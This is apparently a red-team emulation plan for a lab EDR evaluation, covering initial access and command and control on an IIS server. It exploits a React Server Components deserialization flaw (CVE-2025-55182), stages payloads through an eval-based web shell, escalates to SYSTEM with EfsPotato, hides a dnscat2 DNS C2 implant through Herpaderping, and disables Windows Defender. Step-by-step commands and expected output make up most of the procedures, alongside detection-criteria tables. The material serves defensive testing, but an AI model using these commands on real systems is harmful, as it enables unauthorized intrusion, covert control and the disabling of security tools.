# Phase 1 - Initial Access & Command and Control

## Overview

The attacker targets an internal IIS server that hosts a web application: `react.testlab.local`. This application presents a exploitation path that is pursued.

The attacker directly exploits a React Server Components deserialization vulnerability (CVE-2025-55182) on `react.testlab.local` to achieve unauthenticated RCE on the IIS server itself, then escalates to `NT AUTHORITY\SYSTEM` via `SeImpersonatePrivilege`.

---

## Step 0 - Setup

> Full setup procedures are documented in [Setup.md](Setup.md).

---

## Step 1 - Server-Side RCE & Privilege Escalation: React Server Components Exploitation (CVE-2025-55182)

### Voice Track

The attacker exploits `react.testlab.local` - a Next.js application
running on the same IIS server under `iisnode`. A crafted React Server
Components multipart request reaches the vulnerable deserialization path and
executes JavaScript inside the Node.js worker as
`IIS APPPOOL\react.testlab.local`.

This gives the attacker direct unauthenticated code execution on the IIS server
without relying on the workstation path. The react2shell tool is then used as
the staging channel: payloads are uploaded as base64 chunks, decoded with
Node.js filesystem APIs, and launched from the still-live web RCE session.

With `CertEnrollSvc.exe` staged at `C:\Windows\Temp\`, the attacker uses the
AppPool identity's `SeImpersonatePrivilege` to run the next payload as
`NT AUTHORITY\SYSTEM`. `CertEnrollSvc.exe` is the EfsPotato variant used in this
plan; it coerces a privileged local named-pipe connection and launches the
specified command with the impersonated token.

The attacker launches `CertEnrollSvc.exe` directly from the still-live
react2shell session via `eval` + detached `spawn`, passing `CertEnrollAgent.exe`
as the argument. CertEnrollSvc acquires the SYSTEM token and uses it to start
`CertEnrollAgent.exe` - the same CWLHerpaderping binary used in the workstation
path - as `NT AUTHORITY\SYSTEM`. CertEnrollAgent then performs the same
Herpaderping loader flow as Step 2, but in a SYSTEM context on the IIS server.
The ghost process presents as `C:\Windows\System32\RuntimeBroker.exe`, and
dnscat2 establishes a DNS C2 session from the IIS host.

> **Detection Assumption (T1070.004):** File deletion detection for Step 3B
> assumes EDR captures process handle attribution during file I/O operations.
> If the EDR product only provides file-level events without process attribution,
> T1070.004 (Indicator Removal: File Deletion) should be marked as Not Calibrated
> due to failure of Condition 3 (Independently Verifiable) - evaluator cannot
> verify which process deleted `CertCA.bin` without relying on red team claims
> or source code analysis.

> Further reading: [rce-react2shell.md](../further-reading/rce-react2shell.md)
> covers the exploit tool and staging flow; [efspotato.md](../further-reading/efspotato.md)
> covers `CertEnrollSvc.cs`; [process-herpaderping.md](../further-reading/process-herpaderping.md)
> covers `CertEnrollAgent.exe`; [dnscat2.md](../further-reading/dnscat2.md)
> covers the DNS C2 client.

### Setup

- ☣️ Encode `CertEnrollSvc.exe`, `dnscat2.exe`, and `CWLHerpaderping.exe` to base64 on the attacker machine

  ```bash
  cd resources/payloads/react2shell-tool
  python encode_payload.py ../EfsPotato/CertEnrollSvc.exe -o CertEnrollSvc.b64 -l 0
  python encode_payload.py ../dnscat2.exe -o dnscat2.b64 -l 0
  python encode_payload.py ../CWLHerpaderping/x64/Release/CWLHerpaderping.exe -o CertEnrollAgent.b64 -l 0
  ```

  - ***Expected Output***

    ```text
    [+] Encoding successful!
    [*] Lines: 1 x 0 chars
    [+] Encoding successful!
    [*] Lines: 1 x 0 chars
    [+] Encoding successful!
    [*] Lines: 1 x 0 chars
    ```

### Procedures

- ☣️ Launch the interactive exploitation shell against the target

  ```bash
  python run_exploit.py -t http://react.testlab.local
  ```

  - ***Expected Output***

    ```text
    [+] Target: http://react.testlab.local
    [+] Type 'help' for available commands
    [*] Testing connection...
    [+] Connection established!
    ```

#### Step 1A — Reflective Code Loading Demo (T1620)

- ☣️ Upload CertEnrollAgent and dnscat2 payload as base64 (payloads remain encoded)

  ```
  upload CertEnrollAgent.b64 C:\Windows\Temp\CertEnrollAgent.b64
  decode C:\Windows\Temp\CertEnrollAgent.b64 C:\ProgramData\CertEnrollAgent.bin
  rename C:\ProgramData\CertEnrollAgent.bin C:\ProgramData\CertEnrollAgent.exe
  upload dnscat2.b64 C:\Windows\Temp\dnscat2.b64
  ```

  - ***Expected Output (representative)***

    ```text
    [+] File uploaded successfully -> <dest>
    [+] File decoded successfully -> C:\ProgramData\CertEnrollAgent.exe
    [+] File uploaded successfully -> C:\Windows\Temp\dnscat2.b64 (NO process spawn!)
    ```

- ☣️ Reflectively load dnscat2 payload via stdin redirection (T1620) - CertEnrollAgent reads PE bytes from stdin pipe, eliminating disk artifact

  ```
  herpload C:\Windows\Temp\dnscat2.b64 C:\ProgramData\CertEnrollAgent.exe
  ```

  - ***Expected Output***

    ```text
    [*] Reflectively loading C:\Windows\Temp\dnscat2.b64 via C:\ProgramData\CertEnrollAgent.exe stdin (T1620)...
    [+] PE loaded reflectively via stdin (NO disk artifact!)
    [*] Detection: node.exe spawns C:\ProgramData\CertEnrollAgent.exe with stdin pipe containing PE bytes
    [*] Payload never written to disk (T1620 - Reflective Code Loading)
    ```

- ☣️ Switch to the attacker machine and confirm the first C2 session (IIS APPPOOL context)

  ```text
  dnscat2> New session established: <session-id-1>
  dnscat2> session -i <session-id-1>
  command (iis-server) 1> whoami
  ```

  - ***Expected Output***

    ```text
    iis apppool\react.testlab.local
    ```

#### Step 1B — Privilege Escalation + File-based Loading (Full Chain)

- ☣️ Upload EfsPotato escalation tool

  ```
  upload CertEnrollSvc.b64 C:\Windows\Temp\CertEnrollSvc.b64
  decode C:\Windows\Temp\CertEnrollSvc.b64 C:\Windows\Temp\CertEnrollSvc.bin
  rename C:\Windows\Temp\CertEnrollSvc.bin C:\Windows\Temp\CertEnrollSvc.exe
  ```

- ☣️ Upload and decode dnscat2 payload to disk (file-based approach for comparison with T1620)

  ```
  upload dnscat2.b64 C:\Windows\Temp\dnscat2-disk.b64
  decode C:\Windows\Temp\dnscat2-disk.b64 C:\ProgramData\CertCA.bin
  ```

  - ***Expected Output***

    ```text
    [+] File decoded successfully -> C:\ProgramData\CertCA.bin
    ```

- ☣️ Launch `CertEnrollSvc.exe` (EfsPotato) via eval detached spawn - exploits `SeImpersonatePrivilege` to run `CertEnrollAgent.exe` as `NT AUTHORITY\SYSTEM`; CertEnrollAgent reads payload from disk and deletes it (T1070.004)

  ```
  eval process.mainModule.require('child_process').spawn('C:/Windows/Temp/CertEnrollSvc.exe',['C:/ProgramData/CertEnrollAgent.exe'],{detached:true,stdio:'ignore'}).unref()
  ```

  - ***Expected Output***

    ```text
    (no output - detached spawn)
    ```

- ☣️ Switch to the attacker machine and confirm the second C2 session (SYSTEM context)

  ```text
  dnscat2> New session established: <session-id-2>
  dnscat2> session -i <session-id-2>
  command (iis-server) 2> whoami
  ```

  - ***Expected Output***

    ```text
    nt authority\system
    ```

- ☣️ Open an interactive `cmd.exe` shell from the SYSTEM dnscat2 session

  ```text
  command (iis-server) 2> shell
  ```

  - ***Expected Output***

    ```text
    New session created: <session-id-3>
    ```

  ```text
  dnscat2> session -i <session-id-3>
  sh (iis-server) 3>
  ```

  > **Note:** `shell` spawns `cmd.exe` as a child of the `RuntimeBroker.exe` ghost process under `NT AUTHORITY\SYSTEM`. All subsequent commands in Phases 2–5 that run from the IIS01 SYSTEM session execute within this `cmd.exe` child.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Initial Access | T1190 | Exploit Public-Facing Application | Windows | HTTP POST to React RSC endpoint with `Next-Action: x` header and multipart body containing `"then":"$1:__proto__:then"` field; server responds with `X-Action-Redirect: /login?a=<base64>` header carrying command output | Not Calibrated - Not Benign | Attacker sends crafted RSC flight data to `react.testlab.local` exploiting CVE-2025-55182 deserialization to inject JavaScript into `_prefix` field | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py](../../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | -
| Execution | T1059.007 | Command and Scripting Interpreter: JavaScript | Windows | `iisnode` evaluates attacker-controlled JavaScript embedded in the `_prefix` response field; no child process created; execution occurs within the existing Node.js worker process | Not Calibrated - Not Benign | Exploit injects `eval(String.fromCharCode(...))` as the `_prefix` value, executing arbitrary Node.js code in the IIS worker process | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py build_exploit_payload()](../../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | -
| Defense Evasion | T1027.010 | Obfuscated Files or Information: Command Obfuscation | Windows | JavaScript payload delivered as `eval(String.fromCharCode(<decimal-list>))` with no readable string literals; source code is not present in server logs or request bodies | Not Calibrated - Not Benign | All `fs` API calls and path strings are encoded as charcode arrays to evade string-based log detection | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py to_charcode()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` writes or appends 2,000-char chunks to `C:\Windows\Temp\CertEnrollSvc.b64` via `fs.writeFileSync` and `fs.appendFileSync` | Calibrated - Not Benign | `upload` command transfers CertEnrollSvc.exe encoded as base64 in chunks via eval-based `fs` writes - no child process spawned | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py upload()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `node.exe` reads `C:\Windows\Temp\CertEnrollSvc.b64` and writes decoded bytes to `C:\Windows\Temp\CertEnrollSvc.bin`, followed by `fs.renameSync` rename to `C:\Windows\Temp\CertEnrollSvc.exe` | Calibrated - Not Benign | `decode` command decodes base64 file to PE bytes using Node.js `Buffer` API via eval, then `rename` moves the staged `.bin` to `.exe` - no spawn | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py decode()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py), [file_ops.py rename()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Defense Evasion | T1562.006 | Impair Defenses: Indicator Blocking | Windows | `CertEnrollAgent.exe` patches `ntdll!EtwEventWrite` in its own process memory to `xor eax,eax; ret` after changing the code page protection, causing subsequent ETW writes from the loader process to return fake success | Not Calibrated - Not Benign | CWLHerpaderping tampers with ETW before entering the sensitive loader flow; accepted here as an explicit out-of-scope mapping exception because `T1562.006` is not part of the selected Scenario 1 technique set | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp PatchEtw()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Execution | T1106 | Native API | Windows | `CertEnrollAgent.exe` resolves native NT APIs from `ntdll.dll`, builds indirect syscall stubs, and uses them for `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, and `NtCreateThreadEx` during the Herpaderping flow | Not Calibrated - Not Benign | CWLHerpaderping invokes the sensitive process-creation path through indirect syscalls; the loader also wraps those calls with stack spoofing, but the primary ATT&CK behavior here is native API / syscall execution | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp), [syscall.h](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/syscall.h), [StackSpoof.cpp](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/StackSpoof.cpp) | -
| Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | Sysmon Event 1 on IIS01: `CertEnrollAgent.exe` spawned by `CertEnrollSvc.exe` (IIS APPPOOL\react.testlab.local); `CertEnrollAgent.exe` process token context shows `NT AUTHORITY\SYSTEM` — AppPool identity producing a SYSTEM-privileged child is the primary observable of the EfsPotato named-pipe token impersonation chain | Calibrated - Not Benign | Step 3B: CertEnrollSvc uses `SeImpersonatePrivilege` to obtain SYSTEM token (file-based full chain); implementation details in [efspotato.md](../further-reading/efspotato.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs) | -
| Privilege Escalation | T1134.002 | Access Token Manipulation: Create Process with Token | Windows | `CertEnrollSvc.exe` calls `CreateProcessAsUser` with the impersonated token; child process (`CertEnrollAgent.exe`) is created with `CREATE_NO_WINDOW` (`0x08000000`) | Not Calibrated - Not Benign | Step 3B: CertEnrollSvc spawns CertEnrollAgent as SYSTEM (file-based full chain); implementation details in [efspotato.md](../further-reading/efspotato.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs) | -
| Defense Evasion | T1055 | Process Injection | Windows | Sysmon Event 11 on IIS01: `CertEnrollAgent.exe` (NT AUTHORITY\SYSTEM) creates `%SystemRoot%\Temp\HD*.tmp`; Sysmon Event 1: `RuntimeBroker.exe` ghost spawned with `CertEnrollAgent.exe` as parent and no matching on-disk image at `C:\Windows\System32\RuntimeBroker.exe`; Sysmon Event 11: `HD*.tmp` content subsequently overwritten — characteristic Herpaderping file-write-then-overwrite sequence | Calibrated - Not Benign | Step 3B: CWLHerpaderping performs process-herpaderping-style injection (file-based full chain): dnscat2 payload enters ghost process through image section, not via WriteProcessMemory; later remote writes used for metadata spoofing | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | `CertEnrollAgent.exe` spawns a ghost process with PPID pointing to `svchost.exe` or `wininit.exe` in Session 0 | Calibrated - Not Benign | Step 3B: CertEnrollAgent chooses Session 0 parent for ghost process (file-based full chain); implementation details in [process-herpaderping.md](../further-reading/process-herpaderping.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetNonJobParent()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1620 | Reflective Code Loading | Windows | `node.exe` spawns `CertEnrollAgent.exe` with stdin pipe containing PE file bytes (dnscat2.exe payload); no intermediate file creation on disk for the payload binary | Calibrated - Not Benign | Step 3A: CertEnrollAgent reflectively loads dnscat2 from stdin pipe (T1620 demo); payload read from base64 file, decoded in-memory by Node.js, piped via `spawnSync` stdin redirection — dnscat2.exe PE never written to disk, eliminating file artifacts | react.testlab.local | IIS APPPOOL\react.testlab.local | [CWLImplant.cpp GetPayloadBuffer()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp), [file_ops.py herpload()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | -
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollAgent.exe` deletes `C:\ProgramData\CertCA.bin` from disk | Calibrated - Not Benign | Step 3B: CWLHerpaderping deletes dnscat2 payload file after loading to remove forensic evidence (file-based full chain); file deletion occurs in fallback mode when stdin is not redirected | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetPayloadBuffer()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | Sysmon Event 1 on IIS01: ghost process reports `ImageFileName = C:\Windows\System32\RuntimeBroker.exe`; EDR image verification: PE mapped in the ghost process address space does not match the on-disk hash of `C:\Windows\System32\RuntimeBroker.exe` — image path vs. mapped content mismatch is the Herpaderping masquerade artifact | Calibrated - Not Benign | Step 3B: CWLHerpaderping makes ghost process resemble legitimate Windows component by assigning trusted image path (file-based full chain); masquerading outcome mapped separately from PEB rewrite under process argument spoofing | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | `RuntimeBroker.exe` (dnscat2 ghost process) issues a high volume of DNS queries containing encoded subdomain labels to `attacker.local` | Calibrated - Not Benign | Step 3B: dnscat2 C2 session established as SYSTEM via Herpaderping ghost process (file-based full chain); bootstrapped from react2shell session via eval detached spawn of CertEnrollSvc | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe) | -
| Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | DNS query payloads are encrypted after dnscat2 session key negotiation | Not Calibrated - Not Benign | dnscat2 encrypts C2 session data; protocol details are covered in [dnscat2.md](../further-reading/dnscat2.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe) | -
| Discovery | T1012 | Query Registry | Windows | EDR registry access event on IIS01: `RuntimeBroker.exe` (dnscat2 ghost process, NT AUTHORITY\SYSTEM) reads `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer`; `RuntimeBroker.exe` (UWP process broker) reading TCP/IP DNS resolver configuration keys is anomalous | Calibrated - Not Benign | Step 3B: dnscat2 enumerates TCP/IP interface GUIDs, reads NameServer/DhcpNameServer registry values to discover DNS resolver for C2 tunneling (file-based full chain) | react.testlab.local | NT AUTHORITY\SYSTEM | [getdns_windows.go getSystemDNS()](../../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | -
| Defense Evasion | T1564.003 | Hide Artifacts: Hidden Window | Windows | `CertEnrollSvc.exe` spawns `CertEnrollAgent.exe` with `CREATE_NO_WINDOW` (`0x08000000`); dnscat2 executes without a console window | Calibrated - Not Benign | Step 3B: Escalation and C2 launch run without visible console windows (file-based full chain); implementation details in [efspotato.md](../further-reading/efspotato.md) and [dnscat2.md](../further-reading/dnscat2.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs), [dnscat2 build flags](../../resources/payloads/dnscat2/go-client) | -
| Defense Evasion | T1564.010 | Hide Artifacts: Process Argument Spoofing | Windows | EDR cross-process memory write event on IIS01: `CertEnrollAgent.exe` (NT AUTHORITY\SYSTEM) calls `WriteProcessMemory` targeting the PEB `ProcessParameters` region of the `RuntimeBroker.exe` ghost process; the resulting ghost process reports command line and image path inconsistent with the on-disk `C:\Windows\System32\RuntimeBroker.exe` binary | Calibrated - Not Benign | Step 3B: CWLHerpaderping rewrites ghost process PEB metadata to hide true payload identity (file-based full chain); this row captures parameter/PEB spoofing mechanism separate from trusted name masquerading | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | -
| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `CertEnrollAgent.exe` resolves native API addresses via PEB walk and DJB2 EAT hash lookup instead of static imports | Not Calibrated - Not Benign | CWLHerpaderping uses hash-based API resolution; implementation details are covered in [process-herpaderping.md](../further-reading/process-herpaderping.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [api_hash.h](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/api_hash.h) | -
| Defense Evasion | T1027.008 | Obfuscated Files or Information: Stripped Payloads | Windows | `dnscat2.exe` has its Go symbol table and DWARF debug information stripped; `CWLHerpaderping.exe` (deployed as `CertEnrollAgent.exe`) is a Visual C++ release build with no useful debug metadata exposed to responders | Not Calibrated - Not Benign | dnscat2 is compiled with Go release flags that omit symbol and DWARF debug information, while CWLHerpaderping is deployed as a release-built C++ loader renamed to `CertEnrollAgent.exe` | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe), [CWLHerpaderping.exe](../../resources/payloads/CWLHerpaderping/x64/Release/CWLHerpaderping.exe) | -
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | Sysmon Event 1 on IIS01: `cmd.exe` spawned as child of `RuntimeBroker.exe` ghost (dnscat2 SYSTEM parent); command line is `cmd.exe` with no arguments; parent image path is `C:\Windows\System32\RuntimeBroker.exe` | Calibrated - Not Benign | Step 1B: dnscat2 `shell` command spawns `cmd.exe` under the `RuntimeBroker.exe` ghost process as `NT AUTHORITY\SYSTEM`; all subsequent shell commands in Phases 2–5 from the IIS01 SYSTEM session execute within this `cmd.exe` child | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | -

---

> **Optional Step** — Execute before Phase 2 staging if Windows Defender is active on IIS01. Skip if Defender is absent, disabled by policy, or if suppressing AV detection would interfere with test objectives for this run. This step does not affect the Herpaderping ghost process or dnscat2 session established in Step 1.

## Step 2 — Defense Evasion: Disable Windows Defender on IIS01 (Optional)

### Voice Track

With SYSTEM-level code execution established on IIS01, the attacker suppresses
Windows Defender before the server is used as a staging hub for lateral movement
tooling in Phases 2 and 3. Ransomware operators routinely perform this step on any
compromised host that will receive significant payload staging — disabling real-time
scanning prevents delivered binaries from being quarantined between upload and
execution.

Two complementary methods are applied from the SYSTEM dnscat2 shell. The PowerShell
`Set-MpPreference` cmdlet immediately disables the three most impactful scanning
components: real-time monitoring, behaviour monitoring, and script scanning. A
parallel `reg add` write to `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` sets
`DisableAntiSpyware` to `1` under the Group Policy enforcement path, persisting the
disablement across reboots without requiring a service restart. Together the two
methods match the dual-vector AV suppression sequence documented in LockBit Black
and Conti pre-encryption playbooks.

### Procedures

- ☣️ From the IIS01 dnscat2 SYSTEM shell, disable Defender real-time, behaviour, and script scanning

  ```text
  C:\Windows\Temp> powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -DisableScriptScanning 1"
  ```

  - ***Expected Output***

    ```text
    (no output — Set-MpPreference applies settings silently)
    ```

  > **Note:** On Windows Server 2022 with Defender installed, the cmdlet completes
  > silently and Windows Security Centre reflects the change immediately. If the lab
  > Defender policy is managed via GPO from DC01, the GPO may override
  > `Set-MpPreference` values on the next refresh — the `reg add` step below takes
  > precedence when applied under the Policy path.

- ☣️ Write the Group Policy Defender disable key to persist the setting across reboots

  ```text
  C:\Windows\Temp> reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
  ```

  - ***Expected Output***

    ```text
    The operation completed successfully.
    ```

- Verify the registry key was written

  ```text
  C:\Windows\Temp> reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
  ```

  - ***Expected Output***

    ```text
    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender
        DisableAntiSpyware    REG_DWORD    0x1
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Defense Evasion | T1562.001 | Impair Defenses: Disable or Modify Tools | Windows | PowerShell Script Block Log Event 4104 on IIS01: `Set-MpPreference -DisableRealtimeMonitoring 1; -DisableBehaviorMonitoring 1; -DisableScriptScanning 1` executed by `powershell.exe` (child of `RuntimeBroker.exe` ghost, NT AUTHORITY\SYSTEM) | Calibrated - Not Benign | `Set-MpPreference` disables Defender real-time, behaviour, and script scanning from the SYSTEM dnscat2 shell — immediate AV suppression before IIS01 is used as a lateral movement staging host in Phases 2 and 3 | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
| Defense Evasion | T1562.001 | Impair Defenses: Disable or Modify Tools | Windows | Sysmon Event 1 on IIS01: `reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f` spawned from `RuntimeBroker.exe` ghost (NT AUTHORITY\SYSTEM); Sysmon Event 13: `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware` set to `0x1` | Calibrated - Not Benign | `reg add` writes `DisableAntiSpyware=1` under the Windows Defender Group Policy registry path — persists AV disablement across reboots via the policy enforcement path, separately from the `Set-MpPreference` runtime change | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |